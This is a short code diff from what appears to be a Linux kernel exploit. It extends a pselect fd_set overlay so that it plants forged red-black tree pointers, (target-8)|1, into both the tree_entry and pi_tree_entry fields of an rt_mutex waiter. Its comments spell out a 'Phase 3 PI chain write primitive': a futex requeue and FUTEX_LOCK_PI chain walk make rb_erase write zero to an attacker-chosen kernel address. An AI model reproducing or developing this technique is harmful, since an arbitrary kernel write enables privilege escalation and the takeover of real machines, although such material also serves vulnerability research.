@@ -112,22 +112,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      *   +0x18 pi_tree_entry (same)                             = 24 bytes
      *   +0x30 task (8)   +0x38 lock (8)   +0x40 list (16)
      *
-     * PSELECT_ROUTE_NFDS=64 -> 1 word/set = 3 bits total. Only waiter words
-     * 2..4 (tree_entry) are placed; pi_tree_entry words 5..7 are beyond the
-     * copy window and keep real kernel-written values.
+     * PSELECT_ROUTE_NFDS=128 -> 2 words/set = 6 bits total.
+     * Words 2-4 cover tree_entry (+0x00..+0x17).
+     * Words 5-7 cover pi_tree_entry (+0x18..+0x2f).
+     * task(+0x30) and lock(+0x38) are beyond the copy window.
      *
-     * WRITE PRIMITIVE: tree_pc = (target-8)|1.  The requeue rb_erase in
-     * rt_mutex_adjust_prio_chain reads __rb_parent_color as the parent
-     * pointer.  With (target-8)|1:
-     *   parent = ((target-8)|1) & ~3 = target-8
-     *   parent != 0 → skips root path
-     *   reads parent->rb_left (*(target+8)), compares with node → mismatch
-     *   writes node->rb_right (=0) to &parent->rb_right = target
-     *
-     * tree_right/tree_left = 0: node->rb_right = 0 (the value written). */
+     * Phase 3 PI CHAIN WRITE PRIMITIVE:
+     * waiter priority boosted to nice=-20 causes requeue to add waiter
+     * to owner's pi_waiters tree via pi_tree_entry.
+     * pselect overlay sets pi_tree_entry.__rb_parent_color = (target-8)|1.
+     * Consumer FUTEX_LOCK_PI chain walk reorganizes pi_waiters →
+     * rb_erase(waiter) reads parent = target-8 → writes to target. */
     {2, (uint64_t)((pselect_custom_target - 8) | 1), "tree_pc"},
     {3, 0, "tree_right"},
     {4, 0, "tree_left"},
+    {5, (uint64_t)((pselect_custom_target - 8) | 1), "pi_pc"},
+    {6, 0, "pi_right"},
+    {7, 0, "pi_left"},
 #else
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
